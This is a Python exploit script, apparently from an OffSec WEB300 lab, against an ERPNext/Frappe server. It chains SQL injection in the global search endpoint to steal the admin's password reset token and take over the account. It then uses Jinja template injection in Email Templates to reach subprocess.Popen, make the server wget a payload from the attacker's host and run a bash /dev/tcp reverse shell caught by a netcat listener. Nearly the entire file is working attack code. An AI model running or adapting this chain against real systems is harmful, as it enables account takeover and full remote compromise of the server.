import urllib3
import requests
import json
import subprocess
import os

s = requests.session()
host = "http://erpnext:8000"
proxies = {
  "http": "http://127.0.0.1:8080"
}
headers = { "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" }

RHOST = "192.168.45.230"
RPORT = "4444"
LHOST = "erpnext"
LPORT = "8000"

def inject(payload):
    data = {"cmd": "frappe.utils.global_search.web_search",
			"text": "text",
			"scope": "text\" UNION ALL SELECT 1,2,3,4,%s#" % payload
	}
    request = s.post(host, data)
    response = request.text
    if request.status_code == 200:
	    return response
    else:
	    print("[!] Error in inject method.")


def identifyCollation():
  collation_request = inject('COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"')
  data = json.loads(collation_request)
  collation_value = data['message'][0]['route']
  return collation_value

def getAdminMailAdress():
  adminEmailAdressResponse = inject("name COLLATE utf8mb4_general_ci FROM __Auth")
  data = json.loads(adminEmailAdressResponse)
  adminEmailAdressValue = data['message'][1]['route']
  return adminEmailAdressValue
  
def sendPasswordResetRequest(emailAdress):
  host = "http://erpnext:8000/"
  data = {'cmd': 'frappe.core.doctype.user.user.reset_password',
		      'user': emailAdress}
  s.post(host, data)
  #add assertion later

def getPasswordResetToken():
    data = {"cmd": "frappe.utils.global_search.web_search",
            "text": "text",
            "scope": "offsec_scope\" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#"
  	}
    request = s.post(host, data)
    response = request.text
    if request.status_code == 200:
      data = json.loads(response)
      print(response)
      tokenValue = data['message'][2]['route']
      print(response)
      return tokenValue
    else:
	    print("[!] Error in PRT method.")

def resetPassword(token):
	newpass = "QWERTYqwerty12345@"
	data = {'key': token,
          'old_password': '',
          'new_password': newpass,
          'logout_all_sessions': '1',
          'cmd': 'frappe.core.doctype.user.user.update_password'}
	request = s.post(host, data,proxies=proxies)
	response = request.text
	if request.status_code == 200:
		return newpass
	else:
		print("\n[!] Unexpected error.")

def readPopenId():
    classIndex = 0
    createTemplateValue = "doc=%7B%22docstatus%22%3A0%2C%22doctype%22%3A%22Email+Template%22%2C%22name%22%3A%22New+Email+Template+1%22%2C%22__islocal%22%3A1%2C%22__unsaved%22%3A1%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22__newname%22%3A%22test%22%2C%22subject%22%3A%22test%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r+%7D%7D%3C%2Fdiv%3E%22%7D&action=Save"
    executeTemplateValue = "template_name=test&doc=%7B%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r+%7D%7D%3C%2Fdiv%3E%22%2C%22subject%22%3A%22test%22%2C%22name%22%3A%22test%22%2C%22docstatus%22%3A0%2C%22modified%22%3A%222024-07-03+13%3A27%3A50.586466%22%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22creation%22%3A%222024-07-03+13%3A27%3A50.586466%22%2C%22doctype%22%3A%22Email+Template%22%2C%22idx%22%3A0%2C%22modified_by%22%3A%22zeljka.k%40randomdomain.com%22%2C%22__last_sync_on%22%3A%222024-07-03T17%3A28%3A44.435Z%22%7D&_lang="
    createTemplate(createTemplateValue)
    print("[+] Class list template created successfully")

    response = triggerTemplate(executeTemplateValue)
    print("[+] Class list executed created successfully")

    classesList = json.loads(response.content)
    subclasses = classesList['message']['message']
    sub = subclasses.split(', ')
    for index, line in enumerate(sub):
	    if 'subprocess.Popen' in line:
		    index -= 2
		    classIndex = index

    print("[+] Retrieved subprocess.popen class id (%s)" %classIndex)
    deleteTemplate("test")
    return classIndex


def createTemplate(templateValue):
  target = "http://erpnext:8000/api/method/frappe.desk.form.save.savedocs"
  createTemplateData = templateValue
  response = s.post(target, data=createTemplateData, headers=headers)
  print(response.text)

def triggerTemplate(templateValue):
  target = "http://erpnext:8000/api/method/frappe.email.doctype.email_template.email_template.get_email_template"
  data = templateValue
  response = s.post(target, data=data, headers=headers)
  return response

def deleteTemplate(templateName):
    #Deleting template
    target = "http://erpnext:8000/api/method/frappe.client.delete"
    data = "doctype=Email+Template&name=%s" %templateName
    response = s.post(target, data=data, headers=headers)
    if "{}" in response.text:
        print("[+] Template %s deleted Successfully" % templateName)
    else:
        print("Unexpected error when deleting template")

def createRevShell(host, port, directory, filename):
    shell_command = f"bash -i >& /dev/tcp/{host}/{port} 0>&1\n"
    filepath = os.path.join(directory, filename)

    try:
        os.makedirs(directory, exist_ok=True)  # Ensure the directory exists
        with open(filepath, 'w') as f:
            f.write(shell_command)
        print(f"Reverse shell file created successfully at {filepath}.")
    except Exception as e:
        print(f"Failed to write shell command to {filepath}: {e}")

def startListener(port):
    try:
        # Uruchomienie listenera netcat w nowym terminalu
        command = f"terminator -e 'nc -nlvp {port}; exec bash'"
        process = subprocess.Popen(command, shell=True)
        print(f"Netcat listener started on port {port} in a new terminal.")
        return process
    except Exception as e:
        print(f"Failed to start netcat listener: {e}")
        return None

def start_http_server(directory, port):
    # Command to start the HTTP server
    command = f"python3 -m http.server {port}"

    # Create a new terminal using terminator and run the command
    try:
        subprocess.Popen(['terminator', '-x', f'bash -c "cd {directory} && {command}"'])
        print(f"HTTP server started successfully in {directory} on port {port}.")
    except Exception as e:
        print(f"Failed to start HTTP server: {e}")

# Example usage
start_http_server('/path/to/directory', 8000)

def uploadShell(rhost, rport, popen):
  CreateWgetReverseShellTemplate = "doc=%7B%22docstatus%22%3A0%2C%22doctype%22%3A%22Email+Template%22%2C%22name%22%3A%22New+Email+Template+1%22%2C%22__islocal%22%3A1%2C%22__unsaved%22%3A1%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22__newname%22%3A%22wget%22%2C%22subject%22%3A%22wget%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r%5B" + str(popen) + "%5D(%5B%5C%22wget%5C%22%2C+%5C%22" + rhost + "%2Fshell%5C%22%2C+%5C%22-O%5C%22%2C+%5C%22%2Ftmp%2Fshell%5C%22%5D)+%7D%7D%3C%2Fdiv%3E%22%7D&action=Save"
  TriggerWgetReverseShellTemplate = "template_name=wget&doc=%7B%22parentfield%22%3Anull%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r%5B" + str(popen) + "%5D(%5B%5C%22wget%5C%22%2C+%5C%22" + rhost + "%2Fshell%5C%22%2C+%5C%22-O%5C%22%2C+%5C%22%2Ftmp%2Fshell%5C%22%5D)+%7D%7D%3C%2Fdiv%3E%22%2C%22parenttype%22%3Anull%2C%22subject%22%3A%22wget%22%2C%22name%22%3A%22wget%22%2C%22docstatus%22%3A0%2C%22modified%22%3A%222024-07-03+15%3A11%3A33.086005%22%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22creation%22%3A%222024-07-03+15%3A11%3A33.086005%22%2C%22doctype%22%3A%22Email+Template%22%2C%22idx%22%3A0%2C%22modified_by%22%3A%22zeljka.k%40randomdomain.com%22%2C%22parent%22%3Anull%2C%22__last_sync_on%22%3A%222024-07-03T19%3A11%3A33.421Z%22%7D&_lang="

  createTemplate(CreateWgetReverseShellTemplate)
  triggerTemplate(TriggerWgetReverseShellTemplate)

  CreateExecuteReverseShellTemplate = "doc=%7B%22docstatus%22%3A0%2C%22doctype%22%3A%22Email+Template%22%2C%22name%22%3A%22New+Email+Template+1%22%2C%22__islocal%22%3A1%2C%22__unsaved%22%3A1%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22__newname%22%3A%22execute_rev%22%2C%22subject%22%3A%22execute_rev%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r%5B" + str(popen) + "%5D(%5B%5C%22bash%5C%22%2C+%5C%22-c%5C%22%2C+%5C%22%2Fbin%2Fbash+%2Ftmp%2Fshell%5C%22%5D)+%7D%7D%3C%2Fdiv%3E%22%7D&action=Save"
  TriggerExecuteReverseShellTemplate = "template_name=execute_rev&doc=%7B%22parentfield%22%3Anull%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r%5B" + str(popen) + "%5D(%5B%5C%22bash%5C%22%2C+%5C%22-c%5C%22%2C+%5C%22%2Fbin%2Fbash+%2Ftmp%2Fshell%5C%22%5D)+%7D%7D%3C%2Fdiv%3E%22%2C%22parenttype%22%3Anull%2C%22subject%22%3A%22execute_rev%22%2C%22name%22%3A%22execute_rev%22%2C%22docstatus%22%3A0%2C%22modified%22%3A%222024-07-03+15%3A36%3A58.453957%22%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22creation%22%3A%222024-07-03+15%3A36%3A58.453957%22%2C%22doctype%22%3A%22Email+Template%22%2C%22idx%22%3A0%2C%22modified_by%22%3A%22zeljka.k%40randomdomain.com%22%2C%22parent%22%3Anull%2C%22__last_sync_on%22%3A%222024-07-03T19%3A36%3A58.758Z%22%7D&_lang="

  createTemplate(CreateExecuteReverseShellTemplate)
  triggerTemplate(TriggerExecuteReverseShellTemplate)

  
  deleteTemplate("wget")
  deleteTemplate("execute_rev")
 

# SQLI PART
adminEmailAdress = getAdminMailAdress()
sendPasswordResetRequest(adminEmailAdress)
resetToken = getPasswordResetToken()
print(resetToken)
resetPassword(resetToken)
print(resetPassword)
#checkNewCredentialsValidity(username, password)

# RCE PART
createRevShell("192.168.45.230","4444", "/root/WEB300/erpnext", "shell")
startListener(4444)
start_http_server("/root/WEB300/erpnext", 80)
classIndex = readPopenId()
uploadShell("192.168.45.230", "4444", classIndex)
